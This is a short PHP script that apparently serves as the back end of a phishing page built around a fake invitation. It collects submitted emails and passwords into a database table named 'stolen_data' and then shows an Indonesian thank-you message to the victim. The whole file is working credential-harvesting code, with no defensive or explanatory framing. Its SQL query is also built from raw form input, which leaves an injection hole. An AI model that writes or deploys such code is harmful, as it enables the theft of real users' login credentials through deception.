<?php
include "db.php";

$email = $_POST['email'];
$password = $_POST['password'];

$sql = "INSERT INTO stolen_data (email, password) VALUES ('$email', '$password')";

if ($conn->query($sql) === TRUE) {
    echo "<div style='text-align:center;margin-top:50px;'>";
    echo "<h2>✅☺️ Terima kasih sudah konfirmasi!</h2>";
    echo "<a href='index.php'>Kembali ke undangan</a>";
    echo "</div>";
} else {
    echo "Error: " . $conn->error;
}
?>
